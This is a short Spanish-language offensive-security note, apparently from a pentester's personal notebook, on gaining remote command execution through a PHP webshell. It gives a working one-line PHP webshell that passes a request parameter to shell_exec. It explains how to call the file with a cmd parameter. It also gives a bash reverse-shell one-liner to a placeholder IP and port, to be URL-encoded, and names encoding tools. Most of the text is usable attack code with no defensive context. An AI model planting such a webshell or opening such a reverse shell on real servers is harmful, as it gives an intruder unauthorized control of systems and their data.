Archivo que se puede subir al servidor para ejecutar comandos de forma remota
>Basicamente es una alternativa al  fichero que puedas crear con msfvenom
>

```sh fold:"Webshell en php"
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```


## Forma de ejecucion
```sh fold:"Ejecutar Webshell en php"
Buscamos la ruta del fichero .php
y le agregamos
{ip}/ruta al fichero.php?cmd={comando}
# donde el comando es el comando que queramos ejecutar

{ip}/ruta al fichero.php?cmd={comando}
```

## para pasarnos una reversshell debe estar url encodeado

```sh fold:"Envio de bash"
bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"

# tenemos que URL encodear esto
```

# Herramientas URL encoder:
- [URL Encode and Decode - Online Tool (urlencoder.net)](https://www.urlencoder.net/)
- Burpsuite
- 